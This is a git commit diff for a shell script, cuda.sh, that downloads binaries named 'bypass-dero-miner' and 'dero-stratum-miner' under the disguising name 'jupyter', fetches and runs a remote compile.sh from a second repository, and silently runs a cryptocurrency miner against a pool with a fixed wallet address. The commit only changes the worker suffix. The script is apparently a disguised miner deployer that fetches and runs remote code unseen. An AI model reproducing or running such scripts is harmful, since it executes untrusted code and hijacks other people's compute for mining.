ec87db7f03b993654929b7eb29586db6e5f47a48
sarifadim <115786763+sarifadim@users.noreply.github.com>
2022-11-26 09:57:57 +0700

    Update cuda.sh

--- cuda.sh
+++ cuda.sh
@@ -1,5 +1,5 @@
 wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
 wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
 wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
-./jupyter  -r pool.whalesburg.com:4300  -w DEROderoi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S05 >/dev/null 
+./jupyter  -r pool.whalesburg.com:4300  -w DEROderoi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S04 >/dev/null 
 ./compile.sh
